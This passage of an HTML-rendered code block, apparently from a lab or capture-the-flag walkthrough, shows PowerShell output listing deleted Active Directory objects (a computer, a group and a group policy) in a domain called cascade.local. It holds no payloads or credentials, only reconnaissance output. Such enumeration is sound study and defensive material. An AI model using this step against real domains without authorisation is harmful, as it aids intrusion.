</span><span id="__span-68-15"><a id="__codelineno-68-15" name="__codelineno-68-15" href="#__codelineno-68-15"></a>modifyTimeStamp<span class="w">                 </span>:<span class="w"> </span><span class="m">1</span>/13/2020<span class="w"> </span><span class="m">1</span>:21:17<span class="w"> </span>AM
</span><span id="__span-68-16"><a id="__codelineno-68-16" name="__codelineno-68-16" href="#__codelineno-68-16"></a>Name<span class="w">                            </span>:<span class="w"> </span>Deleted<span class="w"> </span>Objects
</span><span id="__span-68-17"><a id="__codelineno-68-17" name="__codelineno-68-17" href="#__codelineno-68-17"></a>ObjectCategory<span class="w">                  </span>:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>Container,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local</span>
</span><span id="__span-68-18"><a id="__codelineno-68-18" name="__codelineno-68-18" href="#__codelineno-68-18"></a>ObjectClass<span class="w">                     </span>:<span class="w"> </span>container
</span><span id="__span-68-19"><a id="__codelineno-68-19" name="__codelineno-68-19" href="#__codelineno-68-19"></a>ObjectGUID<span class="w">                      </span>:<span class="w"> </span>51de9801-3625-4ac2-a605-d6bd71617681
</span><span id="__span-68-20"><a id="__codelineno-68-20" name="__codelineno-68-20" href="#__codelineno-68-20"></a>ProtectedFromAccidentalDeletion<span class="w"> </span>:
</span><span id="__span-68-21"><a id="__codelineno-68-21" name="__codelineno-68-21" href="#__codelineno-68-21"></a>sDRightsEffective<span class="w">               </span>:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-68-22"><a id="__codelineno-68-22" name="__codelineno-68-22" href="#__codelineno-68-22"></a>showInAdvancedViewOnly<span class="w">          </span>:<span class="w"> </span>True
</span><span id="__span-68-23"><a id="__codelineno-68-23" name="__codelineno-68-23" href="#__codelineno-68-23"></a>systemFlags<span class="w">                     </span>:<span class="w"> </span>-1946157056
</span><span id="__span-68-24"><a id="__codelineno-68-24" name="__codelineno-68-24" href="#__codelineno-68-24"></a>uSNChanged<span class="w">                      </span>:<span class="w"> </span><span class="m">65585</span>
</span><span id="__span-68-25"><a id="__codelineno-68-25" name="__codelineno-68-25" href="#__codelineno-68-25"></a>uSNCreated<span class="w">                      </span>:<span class="w"> </span><span class="m">5695</span>
</span><span id="__span-68-26"><a id="__codelineno-68-26" name="__codelineno-68-26" href="#__codelineno-68-26"></a>whenChanged<span class="w">                     </span>:<span class="w"> </span><span class="m">1</span>/13/2020<span class="w"> </span><span class="m">1</span>:21:17<span class="w"> </span>AM
</span><span id="__span-68-27"><a id="__codelineno-68-27" name="__codelineno-68-27" href="#__codelineno-68-27"></a>whenCreated<span class="w">                     </span>:<span class="w"> </span><span class="m">1</span>/9/2020<span class="w"> </span><span class="m">3</span>:31:39<span class="w"> </span>PM
</span><span id="__span-68-28"><a id="__codelineno-68-28" name="__codelineno-68-28" href="#__codelineno-68-28"></a>
</span><span id="__span-68-29"><a id="__codelineno-68-29" name="__codelineno-68-29" href="#__codelineno-68-29"></a>accountExpires<span class="w">                  </span>:<span class="w"> </span><span class="m">9223372036854775807</span>
</span><span id="__span-68-30"><a id="__codelineno-68-30" name="__codelineno-68-30" href="#__codelineno-68-30"></a>badPasswordTime<span class="w">                 </span>:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-68-31"><a id="__codelineno-68-31" name="__codelineno-68-31" href="#__codelineno-68-31"></a>badPwdCount<span class="w">                     </span>:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-68-32"><a id="__codelineno-68-32" name="__codelineno-68-32" href="#__codelineno-68-32"></a>CanonicalName<span class="w">                   </span>:<span class="w"> </span>cascade.local/Deleted<span class="w"> </span>Objects/CASC-WS1
</span><span id="__span-68-33"><a id="__codelineno-68-33" name="__codelineno-68-33" href="#__codelineno-68-33"></a><span class="w">                                  </span>DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
</span><span id="__span-68-34"><a id="__codelineno-68-34" name="__codelineno-68-34" href="#__codelineno-68-34"></a>CN<span class="w">                              </span>:<span class="w"> </span>CASC-WS1
</span><span id="__span-68-35"><a id="__codelineno-68-35" name="__codelineno-68-35" href="#__codelineno-68-35"></a><span class="w">                                  </span>DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
</span><span id="__span-68-36"><a id="__codelineno-68-36" name="__codelineno-68-36" href="#__codelineno-68-36"></a>codePage<span class="w">                        </span>:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-68-37"><a id="__codelineno-68-37" name="__codelineno-68-37" href="#__codelineno-68-37"></a>countryCode<span class="w">                     </span>:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-68-38"><a id="__codelineno-68-38" name="__codelineno-68-38" href="#__codelineno-68-38"></a>Created<span class="w">                         </span>:<span class="w"> </span><span class="m">1</span>/9/2020<span class="w"> </span><span class="m">7</span>:30:19<span class="w"> </span>PM
</span><span id="__span-68-39"><a id="__codelineno-68-39" name="__codelineno-68-39" href="#__codelineno-68-39"></a>createTimeStamp<span class="w">                 </span>:<span class="w"> </span><span class="m">1</span>/9/2020<span class="w"> </span><span class="m">7</span>:30:19<span class="w"> </span>PM
</span><span id="__span-68-40"><a id="__codelineno-68-40" name="__codelineno-68-40" href="#__codelineno-68-40"></a>Deleted<span class="w">                         </span>:<span class="w"> </span>True
</span><span id="__span-68-41"><a id="__codelineno-68-41" name="__codelineno-68-41" href="#__codelineno-68-41"></a>Description<span class="w">                     </span>:
</span><span id="__span-68-42"><a id="__codelineno-68-42" name="__codelineno-68-42" href="#__codelineno-68-42"></a>DisplayName<span class="w">                     </span>:
</span><span id="__span-68-43"><a id="__codelineno-68-43" name="__codelineno-68-43" href="#__codelineno-68-43"></a>DistinguishedName<span class="w">               </span>:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>CASC-WS1<span class="se">\0</span>ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN<span class="o">=</span>Deleted<span class="w"> </span>Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local</span>
</span><span id="__span-68-44"><a id="__codelineno-68-44" name="__codelineno-68-44" href="#__codelineno-68-44"></a>dSCorePropagationData<span class="w">           </span>:<span class="w"> </span><span class="o">{</span><span class="m">1</span>/17/2020<span class="w"> </span><span class="m">3</span>:37:36<span class="w"> </span>AM,<span class="w"> </span><span class="m">1</span>/17/2020<span class="w"> </span><span class="m">12</span>:14:04<span class="w"> </span>AM,<span class="w"> </span><span class="m">1</span>/9/2020<span class="w"> </span><span class="m">7</span>:30:19<span class="w"> </span>PM,<span class="w"> </span><span class="m">1</span>/1/1601<span class="w"> </span><span class="m">12</span>:04:17<span class="w"> </span>AM<span class="o">}</span>
</span><span id="__span-68-45"><a id="__codelineno-68-45" name="__codelineno-68-45" href="#__codelineno-68-45"></a>instanceType<span class="w">                    </span>:<span class="w"> </span><span class="m">4</span>
</span><span id="__span-68-46"><a id="__codelineno-68-46" name="__codelineno-68-46" href="#__codelineno-68-46"></a>isCriticalSystemObject<span class="w">          </span>:<span class="w"> </span>False
</span><span id="__span-68-47"><a id="__codelineno-68-47" name="__codelineno-68-47" href="#__codelineno-68-47"></a>isDeleted<span class="w">                       </span>:<span class="w"> </span>True
</span><span id="__span-68-48"><a id="__codelineno-68-48" name="__codelineno-68-48" href="#__codelineno-68-48"></a>LastKnownParent<span class="w">                 </span>:<span class="w"> </span><span class="nv">OU</span><span class="o">=</span>Computers,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local</span>
</span><span id="__span-68-49"><a id="__codelineno-68-49" name="__codelineno-68-49" href="#__codelineno-68-49"></a>lastLogoff<span class="w">                      </span>:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-68-50"><a id="__codelineno-68-50" name="__codelineno-68-50" href="#__codelineno-68-50"></a>lastLogon<span class="w">                       </span>:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-68-51"><a id="__codelineno-68-51" name="__codelineno-68-51" href="#__codelineno-68-51"></a>localPolicyFlags<span class="w">                </span>:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-68-52"><a id="__codelineno-68-52" name="__codelineno-68-52" href="#__codelineno-68-52"></a>logonCount<span class="w">                      </span>:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-68-53"><a id="__codelineno-68-53" name="__codelineno-68-53" href="#__codelineno-68-53"></a>Modified<span class="w">                        </span>:<span class="w"> </span><span class="m">1</span>/28/2020<span class="w"> </span><span class="m">6</span>:08:35<span class="w"> </span>PM
</span><span id="__span-68-54"><a id="__codelineno-68-54" name="__codelineno-68-54" href="#__codelineno-68-54"></a>modifyTimeStamp<span class="w">                 </span>:<span class="w"> </span><span class="m">1</span>/28/2020<span class="w"> </span><span class="m">6</span>:08:35<span class="w"> </span>PM
</span><span id="__span-68-55"><a id="__codelineno-68-55" name="__codelineno-68-55" href="#__codelineno-68-55"></a>msDS-LastKnownRDN<span class="w">               </span>:<span class="w"> </span>CASC-WS1
</span><span id="__span-68-56"><a id="__codelineno-68-56" name="__codelineno-68-56" href="#__codelineno-68-56"></a>Name<span class="w">                            </span>:<span class="w"> </span>CASC-WS1
</span><span id="__span-68-57"><a id="__codelineno-68-57" name="__codelineno-68-57" href="#__codelineno-68-57"></a><span class="w">                                  </span>DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
</span><span id="__span-68-58"><a id="__codelineno-68-58" name="__codelineno-68-58" href="#__codelineno-68-58"></a>nTSecurityDescriptor<span class="w">            </span>:<span class="w"> </span>System.DirectoryServices.ActiveDirectorySecurity
</span><span id="__span-68-59"><a id="__codelineno-68-59" name="__codelineno-68-59" href="#__codelineno-68-59"></a>ObjectCategory<span class="w">                  </span>:
</span><span id="__span-68-60"><a id="__codelineno-68-60" name="__codelineno-68-60" href="#__codelineno-68-60"></a>ObjectClass<span class="w">                     </span>:<span class="w"> </span>computer
</span><span id="__span-68-61"><a id="__codelineno-68-61" name="__codelineno-68-61" href="#__codelineno-68-61"></a>ObjectGUID<span class="w">                      </span>:<span class="w"> </span>6d97daa4-2e82-4946-a11e-f91fa18bfabe
</span><span id="__span-68-62"><a id="__codelineno-68-62" name="__codelineno-68-62" href="#__codelineno-68-62"></a>objectSid<span class="w">                       </span>:<span class="w"> </span>S-1-5-21-3332504370-1206983947-1165150453-1108
</span><span id="__span-68-63"><a id="__codelineno-68-63" name="__codelineno-68-63" href="#__codelineno-68-63"></a>primaryGroupID<span class="w">                  </span>:<span class="w"> </span><span class="m">515</span>
</span><span id="__span-68-64"><a id="__codelineno-68-64" name="__codelineno-68-64" href="#__codelineno-68-64"></a>ProtectedFromAccidentalDeletion<span class="w"> </span>:<span class="w"> </span>False
</span><span id="__span-68-65"><a id="__codelineno-68-65" name="__codelineno-68-65" href="#__codelineno-68-65"></a>pwdLastSet<span class="w">                      </span>:<span class="w"> </span><span class="m">132230718192147073</span>
</span><span id="__span-68-66"><a id="__codelineno-68-66" name="__codelineno-68-66" href="#__codelineno-68-66"></a>sAMAccountName<span class="w">                  </span>:<span class="w"> </span>CASC-WS1$
</span><span id="__span-68-67"><a id="__codelineno-68-67" name="__codelineno-68-67" href="#__codelineno-68-67"></a>sDRightsEffective<span class="w">               </span>:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-68-68"><a id="__codelineno-68-68" name="__codelineno-68-68" href="#__codelineno-68-68"></a>userAccountControl<span class="w">              </span>:<span class="w"> </span><span class="m">4128</span>
</span><span id="__span-68-69"><a id="__codelineno-68-69" name="__codelineno-68-69" href="#__codelineno-68-69"></a>uSNChanged<span class="w">                      </span>:<span class="w"> </span><span class="m">245849</span>
</span><span id="__span-68-70"><a id="__codelineno-68-70" name="__codelineno-68-70" href="#__codelineno-68-70"></a>uSNCreated<span class="w">                      </span>:<span class="w"> </span><span class="m">24603</span>
</span><span id="__span-68-71"><a id="__codelineno-68-71" name="__codelineno-68-71" href="#__codelineno-68-71"></a>whenChanged<span class="w">                     </span>:<span class="w"> </span><span class="m">1</span>/28/2020<span class="w"> </span><span class="m">6</span>:08:35<span class="w"> </span>PM
</span><span id="__span-68-72"><a id="__codelineno-68-72" name="__codelineno-68-72" href="#__codelineno-68-72"></a>whenCreated<span class="w">                     </span>:<span class="w"> </span><span class="m">1</span>/9/2020<span class="w"> </span><span class="m">7</span>:30:19<span class="w"> </span>PM
</span><span id="__span-68-73"><a id="__codelineno-68-73" name="__codelineno-68-73" href="#__codelineno-68-73"></a>
</span><span id="__span-68-74"><a id="__codelineno-68-74" name="__codelineno-68-74" href="#__codelineno-68-74"></a>CanonicalName<span class="w">                   </span>:<span class="w"> </span>cascade.local/Deleted<span class="w"> </span>Objects/Scheduled<span class="w"> </span>Tasks
</span><span id="__span-68-75"><a id="__codelineno-68-75" name="__codelineno-68-75" href="#__codelineno-68-75"></a><span class="w">                                  </span>DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
</span><span id="__span-68-76"><a id="__codelineno-68-76" name="__codelineno-68-76" href="#__codelineno-68-76"></a>CN<span class="w">                              </span>:<span class="w"> </span>Scheduled<span class="w"> </span>Tasks
</span><span id="__span-68-77"><a id="__codelineno-68-77" name="__codelineno-68-77" href="#__codelineno-68-77"></a><span class="w">                                  </span>DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
</span><span id="__span-68-78"><a id="__codelineno-68-78" name="__codelineno-68-78" href="#__codelineno-68-78"></a>Created<span class="w">                         </span>:<span class="w"> </span><span class="m">1</span>/13/2020<span class="w"> </span><span class="m">5</span>:21:53<span class="w"> </span>PM
</span><span id="__span-68-79"><a id="__codelineno-68-79" name="__codelineno-68-79" href="#__codelineno-68-79"></a>createTimeStamp<span class="w">                 </span>:<span class="w"> </span><span class="m">1</span>/13/2020<span class="w"> </span><span class="m">5</span>:21:53<span class="w"> </span>PM
</span><span id="__span-68-80"><a id="__codelineno-68-80" name="__codelineno-68-80" href="#__codelineno-68-80"></a>Deleted<span class="w">                         </span>:<span class="w"> </span>True
</span><span id="__span-68-81"><a id="__codelineno-68-81" name="__codelineno-68-81" href="#__codelineno-68-81"></a>Description<span class="w">                     </span>:
</span><span id="__span-68-82"><a id="__codelineno-68-82" name="__codelineno-68-82" href="#__codelineno-68-82"></a>DisplayName<span class="w">                     </span>:
</span><span id="__span-68-83"><a id="__codelineno-68-83" name="__codelineno-68-83" href="#__codelineno-68-83"></a>DistinguishedName<span class="w">               </span>:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>Scheduled<span class="w"> </span>Tasks<span class="se">\0</span>ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN<span class="o">=</span>Deleted<span class="w"> </span>Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local</span>
</span><span id="__span-68-84"><a id="__codelineno-68-84" name="__codelineno-68-84" href="#__codelineno-68-84"></a>dSCorePropagationData<span class="w">           </span>:<span class="w"> </span><span class="o">{</span><span class="m">1</span>/17/2020<span class="w"> </span><span class="m">9</span>:35:46<span class="w"> </span>PM,<span class="w"> </span><span class="m">1</span>/17/2020<span class="w"> </span><span class="m">9</span>:32:57<span class="w"> </span>PM,<span class="w"> </span><span class="m">1</span>/17/2020<span class="w"> </span><span class="m">3</span>:37:36<span class="w"> </span>AM,<span class="w"> </span><span class="m">1</span>/17/2020<span class="w"> </span><span class="m">12</span>:14:04<span class="w"> </span>AM...<span class="o">}</span>
</span><span id="__span-68-85"><a id="__codelineno-68-85" name="__codelineno-68-85" href="#__codelineno-68-85"></a>groupType<span class="w">                       </span>:<span class="w"> </span>-2147483644
</span><span id="__span-68-86"><a id="__codelineno-68-86" name="__codelineno-68-86" href="#__codelineno-68-86"></a>instanceType<span class="w">                    </span>:<span class="w"> </span><span class="m">4</span>
</span><span id="__span-68-87"><a id="__codelineno-68-87" name="__codelineno-68-87" href="#__codelineno-68-87"></a>isDeleted<span class="w">                       </span>:<span class="w"> </span>True
</span><span id="__span-68-88"><a id="__codelineno-68-88" name="__codelineno-68-88" href="#__codelineno-68-88"></a>LastKnownParent<span class="w">                 </span>:<span class="w"> </span><span class="nv">OU</span><span class="o">=</span>Groups,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local</span>
</span><span id="__span-68-89"><a id="__codelineno-68-89" name="__codelineno-68-89" href="#__codelineno-68-89"></a>Modified<span class="w">                        </span>:<span class="w"> </span><span class="m">1</span>/28/2020<span class="w"> </span><span class="m">6</span>:07:55<span class="w"> </span>PM
</span><span id="__span-68-90"><a id="__codelineno-68-90" name="__codelineno-68-90" href="#__codelineno-68-90"></a>modifyTimeStamp<span class="w">                 </span>:<span class="w"> </span><span class="m">1</span>/28/2020<span class="w"> </span><span class="m">6</span>:07:55<span class="w"> </span>PM
</span><span id="__span-68-91"><a id="__codelineno-68-91" name="__codelineno-68-91" href="#__codelineno-68-91"></a>msDS-LastKnownRDN<span class="w">               </span>:<span class="w"> </span>Scheduled<span class="w"> </span>Tasks
</span><span id="__span-68-92"><a id="__codelineno-68-92" name="__codelineno-68-92" href="#__codelineno-68-92"></a>Name<span class="w">                            </span>:<span class="w"> </span>Scheduled<span class="w"> </span>Tasks
</span><span id="__span-68-93"><a id="__codelineno-68-93" name="__codelineno-68-93" href="#__codelineno-68-93"></a><span class="w">                                  </span>DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
</span><span id="__span-68-94"><a id="__codelineno-68-94" name="__codelineno-68-94" href="#__codelineno-68-94"></a>nTSecurityDescriptor<span class="w">            </span>:<span class="w"> </span>System.DirectoryServices.ActiveDirectorySecurity
</span><span id="__span-68-95"><a id="__codelineno-68-95" name="__codelineno-68-95" href="#__codelineno-68-95"></a>ObjectCategory<span class="w">                  </span>:
</span><span id="__span-68-96"><a id="__codelineno-68-96" name="__codelineno-68-96" href="#__codelineno-68-96"></a>ObjectClass<span class="w">                     </span>:<span class="w"> </span>group
</span><span id="__span-68-97"><a id="__codelineno-68-97" name="__codelineno-68-97" href="#__codelineno-68-97"></a>ObjectGUID<span class="w">                      </span>:<span class="w"> </span><span class="m">13375728</span>-5ddb-4137-b8b8-b9041d1d3fd2
</span><span id="__span-68-98"><a id="__codelineno-68-98" name="__codelineno-68-98" href="#__codelineno-68-98"></a>objectSid<span class="w">                       </span>:<span class="w"> </span>S-1-5-21-3332504370-1206983947-1165150453-1131
</span><span id="__span-68-99"><a id="__codelineno-68-99" name="__codelineno-68-99" href="#__codelineno-68-99"></a>ProtectedFromAccidentalDeletion<span class="w"> </span>:<span class="w"> </span>False
</span><span id="__span-68-100"><a id="__codelineno-68-100" name="__codelineno-68-100" href="#__codelineno-68-100"></a>sAMAccountName<span class="w">                  </span>:<span class="w"> </span>Scheduled<span class="w"> </span>Tasks
</span><span id="__span-68-101"><a id="__codelineno-68-101" name="__codelineno-68-101" href="#__codelineno-68-101"></a>sDRightsEffective<span class="w">               </span>:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-68-102"><a id="__codelineno-68-102" name="__codelineno-68-102" href="#__codelineno-68-102"></a>uSNChanged<span class="w">                      </span>:<span class="w"> </span><span class="m">245848</span>
</span><span id="__span-68-103"><a id="__codelineno-68-103" name="__codelineno-68-103" href="#__codelineno-68-103"></a>uSNCreated<span class="w">                      </span>:<span class="w"> </span><span class="m">114790</span>
</span><span id="__span-68-104"><a id="__codelineno-68-104" name="__codelineno-68-104" href="#__codelineno-68-104"></a>whenChanged<span class="w">                     </span>:<span class="w"> </span><span class="m">1</span>/28/2020<span class="w"> </span><span class="m">6</span>:07:55<span class="w"> </span>PM
</span><span id="__span-68-105"><a id="__codelineno-68-105" name="__codelineno-68-105" href="#__codelineno-68-105"></a>whenCreated<span class="w">                     </span>:<span class="w"> </span><span class="m">1</span>/13/2020<span class="w"> </span><span class="m">5</span>:21:53<span class="w"> </span>PM
</span><span id="__span-68-106"><a id="__codelineno-68-106" name="__codelineno-68-106" href="#__codelineno-68-106"></a>
</span><span id="__span-68-107"><a id="__codelineno-68-107" name="__codelineno-68-107" href="#__codelineno-68-107"></a>CanonicalName<span class="w">                   </span>:<span class="w"> </span>cascade.local/Deleted<span class="w"> </span>Objects/<span class="o">{</span>A403B701-A528-4685-A816-FDEE32BDDCBA<span class="o">}</span>
</span><span id="__span-68-108"><a id="__codelineno-68-108" name="__codelineno-68-108" href="#__codelineno-68-108"></a><span class="w">                                  </span>DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
</span><span id="__span-68-109"><a id="__codelineno-68-109" name="__codelineno-68-109" href="#__codelineno-68-109"></a>CN<span class="w">                              </span>:<span class="w"> </span><span class="o">{</span>A403B701-A528-4685-A816-FDEE32BDDCBA<span class="o">}</span>
</span><span id="__span-68-110"><a id="__codelineno-68-110" name="__codelineno-68-110" href="#__codelineno-68-110"></a><span class="w">                                  </span>DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
</span><span id="__span-68-111"><a id="__codelineno-68-111" name="__codelineno-68-111" href="#__codelineno-68-111"></a>Created<span class="w">                         </span>:<span class="w"> </span><span class="m">1</span>/26/2020<span class="w"> </span><span class="m">2</span>:34:30<span class="w"> </span>AM
</span><span id="__span-68-112"><a id="__codelineno-68-112" name="__codelineno-68-112" href="#__codelineno-68-112"></a>createTimeStamp<span class="w">                 </span>:<span class="w"> </span><span class="m">1</span>/26/2020<span class="w"> </span><span class="m">2</span>:34:30<span class="w"> </span>AM
</span><span id="__span-68-113"><a id="__codelineno-68-113" name="__codelineno-68-113" href="#__codelineno-68-113"></a>Deleted<span class="w">                         </span>:<span class="w"> </span>True
</span><span id="__span-68-114"><a id="__codelineno-68-114" name="__codelineno-68-114" href="#__codelineno-68-114"></a>Description<span class="w">                     </span>:
</span><span id="__span-68-115"><a id="__codelineno-68-115" name="__codelineno-68-115" href="#__codelineno-68-115"></a>DisplayName<span class="w">                     </span>:<span class="w"> </span>Block<span class="w"> </span>Potato
</span><span id="__span-68-116"><a id="__codelineno-68-116" name="__codelineno-68-116" href="#__codelineno-68-116"></a>DistinguishedName<span class="w">               </span>:<span class="w"> </span><span class="nv">CN</span><span class="o">={</span>A403B701-A528-4685-A816-FDEE32BDDCBA<span class="o">}</span><span class="se">\0</span>ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN<span class="o">=</span>Deleted<span class="w"> </span>Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local</span>
</span><span id="__span-68-117"><a id="__codelineno-68-117" name="__codelineno-68-117" href="#__codelineno-68-117"></a>dSCorePropagationData<span class="w">           </span>:<span class="w"> </span><span class="o">{</span><span class="m">1</span>/1/1601<span class="w"> </span><span class="m">12</span>:00:00<span class="w"> </span>AM<span class="o">}</span>
</span><span id="__span-68-118"><a id="__codelineno-68-118" name="__codelineno-68-118" href="#__codelineno-68-118"></a>flags<span class="w">                           </span>:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-68-119"><a id="__codelineno-68-119" name="__codelineno-68-119" href="#__codelineno-68-119"></a>gPCFileSysPath<span class="w">                  </span>:<span class="w"> </span><span class="se">\\</span>cascade.local<span class="se">\S</span>ysVol<span class="se">\c</span>ascade.local<span class="se">\P</span>olicies<span class="se">\{</span>A403B701-A528-4685-A816-FDEE32BDDCBA<span class="o">}</span>
</span><span id="__span-68-120"><a id="__codelineno-68-120" name="__codelineno-68-120" href="#__codelineno-68-120"></a>gPCFunctionalityVersion<span class="w">         </span>:<span class="w"> </span><span class="m">2</span>
</span><span id="__span-68-121"><a id="__codelineno-68-121" name="__codelineno-68-121" href="#__codelineno-68-121"></a>gPCMachineExtensionNames<span class="w">        </span>:<span class="w"> </span><span class="o">[{</span>35378EAC-683F-11D2-A89A-00C04FBBCFA2<span class="o">}{</span>53D6AB1D-2488-11D1-A28C-00C04FB94F17<span class="o">}][{</span>B1BE8D72-6EAC-11D2-A4EA-00C04F79F83A<span class="o">}{</span>53D6AB1D-2488-11D1-A28C-00C04FB94F17<span class="o">}]</span>
</span><span id="__span-68-122"><a id="__codelineno-68-122" name="__codelineno-68-122" href="#__codelineno-68-122"></a>instanceType<span class="w">                    </span>:<span class="w"> </span><span class="m">4</span>
</span><span id="__span-68-123"><a id="__codelineno-68-123" name="__codelineno-68-123" href="#__codelineno-68-123"></a>isDeleted<span class="w">                       </span>:<span class="w"> </span>True
</span><span id="__span-68-124"><a id="__codelineno-68-124" name="__codelineno-68-124" href="#__codelineno-68-124"></a>LastKnownParent<span class="w">                 </span>:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>Policies,CN<span class="o">=</span>System,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local</span>
</span><span id="__span-68-125"><a id="__codelineno-68-125" name="__codelineno-68-125" href="#__codelineno-68-125"></a>Modified<span class="w">                        </span>:<span class="w"> </span><span class="m">1</span>/26/2020<span class="w"> </span><span class="m">2</span>:40:52<span class="w"> </span>AM
</span><span id="__span-68-126"><a id="__codelineno-68-126" name="__codelineno-68-126" href="#__codelineno-68-126"></a>modifyTimeStamp<span class="w">                 </span>:<span class="w"> </span><span class="m">1</span>/26/2020<span class="w"> </span><span class="m">2</span>:40:52<span class="w"> </span>AM
</span><span id="__span-68-127"><a id="__codelineno-68-127" name="__codelineno-68-127" href="#__codelineno-68-127"></a>msDS-LastKnownRDN<span class="w">               </span>:<span class="w"> </span><span class="o">{</span>A403B701-A528-4685-A816-FDEE32BDDCBA<span class="o">}</span>
</span><span id="__span-68-128"><a id="__codelineno-68-128" name="__codelineno-68-128" href="#__codelineno-68-128"></a>Name<span class="w">                            </span>:<span class="w"> </span><span class="o">{</span>A403B701-A528-4685-A816-FDEE32BDDCBA<span class="o">}</span>
</span><span id="__span-68-129"><a id="__codelineno-68-129" name="__codelineno-68-129" href="#__codelineno-68-129"></a><span class="w">                                  </span>DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
</span><span id="__span-68-130"><a id="__codelineno-68-130" name="__codelineno-68-130" href="#__codelineno-68-130"></a>nTSecurityDescriptor<span class="w">            </span>:<span class="w"> </span>System.DirectoryServices.ActiveDirectorySecurity
</span><span id="__span-68-131"><a id="__codelineno-68-131" name="__codelineno-68-131" href="#__codelineno-68-131"></a>ObjectCategory<span class="w">                  </span>:
</span><span id="__span-68-132"><a id="__codelineno-68-132" name="__codelineno-68-132" href="#__codelineno-68-132"></a>ObjectClass<span class="w">                     </span>:<span class="w"> </span>groupPolicyContainer
</span><span id="__span-68-133"><a id="__codelineno-68-133" name="__codelineno-68-133" href="#__codelineno-68-133"></a>ObjectGUID<span class="w">                      </span>:<span class="w"> </span>ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
</span><span id="__span-68-134"><a id="__codelineno-68-134" name="__codelineno-68-134" href="#__codelineno-68-134"></a>ProtectedFromAccidentalDeletion<span class="w"> </span>:<span class="w"> </span>False
</span><span id="__span-68-135"><a id="__codelineno-68-135" name="__codelineno-68-135" href="#__codelineno-68-135"></a>sDRightsEffective<span class="w">               </span>:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-68-136"><a id="__codelineno-68-136" name="__codelineno-68-136" href="#__codelineno-68-136"></a>showInAdvancedViewOnly<span class="w">          </span>:<span class="w"> </span>True
</span><span id="__span-68-137"><a id="__codelineno-68-137" name="__codelineno-68-137" href="#__codelineno-68-137"></a>uSNChanged<span class="w">                      </span>:<span class="w"> </span><span class="m">196701</span>
</span><span id="__span-68-138"><a id="__codelineno-68-138" name="__codelineno-68-138" href="#__codelineno-68-138"></a>uSNCreated<span class="w">                      </span>:<span class="w"> </span><span class="m">196688</span>
</span><span id="__span-68-139"><a id="__codelineno-68-139" name="__codelineno-68-139" href="#__codelineno-68-139"></a>versionNumber<span class="w">                   </span>:<span class="w"> </span><span class="m">2</span>
</span><span id="__span-68-140"><a id="__codelineno-68-140" name="__codelineno-68-140" href="#__codelineno-68-140"></a>whenChanged<span class="w">                     </span>:<span class="w"> </span><span class="m">1</span>/26/2020<span class="w"> </span><span class="m">2</span>:40:52<span class="w"> </span>AM
</span><span id="__span-68-141"><a id="__codelineno-68-141" name="__codelineno-68-141" href="#__codelineno-68-141"></a>whenCreated<span class="w">                     </span>:<span class="w"> </span><span class="m">1</span>/26/2020<span class="w"> </span><span class="m">2</span>:34:30<span class="w"> </span>AM
</span><span id="__span-68-142"><a id="__codelineno-68-142" name="__codelineno-68-142" href="#__codelineno-68-142"></a>
</span><span id="__span-68-143"><a id="__codelineno-68-143" name="__codelineno-68-143" href="#__codelineno-68-143"></a>CanonicalName<span class="w">                   </span>:<span class="w"> </span>cascade.local/Deleted<span class="w"> </span>Objects/Machine
</span><span id="__span-68-144"><a id="__codelineno-68-144" name="__codelineno-68-144" href="#__codelineno-68-144"></a><span class="w">                                  </span>DEL:93c23674-e411-400b-bb9f-c0340bda5a34
</span><span id="__span-68-145"><a id="__codelineno-68-145" name="__codelineno-68-145" href="#__codelineno-68-145"></a>CN<span class="w">                              </span>:<span class="w"> </span>Machine
</span><span id="__span-68-146"><a id="__codelineno-68-146" name="__codelineno-68-146" href="#__codelineno-68-146"></a><span class="w">                                  </span>DEL:93c23674-e411-400b-bb9f-c0340bda5a34
</span><span id="__span-68-147"><a id="__codelineno-68-147" name="__codelineno-68-147" href="#__codelineno-68-147"></a>Created<span class="w">                         </span>:<span class="w"> </span><span class="m">1</span>/26/2020<span class="w"> </span><span class="m">2</span>:34:31<span class="w"> </span>AM
</span><span id="__span-68-148"><a id="__codelineno-68-148" name="__codelineno-68-148" href="#__codelineno-68-148"></a>createTimeStamp<span class="w">                 </span>:<span class="w"> </span><span class="m">1</span>/26/2020<span class="w"> </span><span class="m">2</span>:34:31<span class="w"> </span>AM
